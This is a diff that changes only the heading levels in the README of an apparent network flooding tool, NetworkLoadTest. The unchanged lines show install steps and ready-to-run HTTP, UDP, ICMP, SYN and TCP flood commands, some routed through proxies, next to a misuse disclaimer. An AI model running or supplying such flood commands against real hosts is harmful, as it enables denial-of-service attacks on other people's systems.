@@ -23,34 +23,34 @@ The author is not responsible for any misuse, damage, or legal consequences.
 - requests
 - scapy
 
-## Installation
+# Installation
 
-# Clone the repository
+## Clone the repository
 git clone https://github.com/secure-analyst/NetworkLoadTest.git
 
-# Navigate to the folder
+## Navigate to the folder
 cd NetworkLoadTest
 
-# Install dependencies
+## Install dependencies
 pip install -r requirements.txt
 
-## Usage
-# HTTP flood
+# Usage
+## HTTP flood
 python NetworkLoadTest.py httpflood --url https://example.com/ --quantity 100 --duration 30 --delay 1 --proxies http://proxy1.com:8080 http://proxy2.com:8080
 
-# UDP flood
+## UDP flood
 python NetworkLoadTest.py udpflood --target_ip 192.168.1.1 --quantity 200 --duration 45 --port 53
 
-# ICMP flood
+## ICMP flood
 python NetworkLoadTest.py icmpflood --target_ip 192.168.1.1 --quantity 1000 --duration 30 --weight 64
 
-# SYN flood
+## SYN flood
 python NetworkLoadTest.py synflood --target_ip 192.168.1.1 --quantity 500 --duration 60 --port 80
 
-# TCP flood
+## TCP flood
 python NetworkLoadTest.py tcpflood --target_ip 192.168.1.1 --quantity 50 --duration 60 --port 443 --timeout 2
 
-## Reference
+# Reference
 
 HTTPFLOOD
 ---------
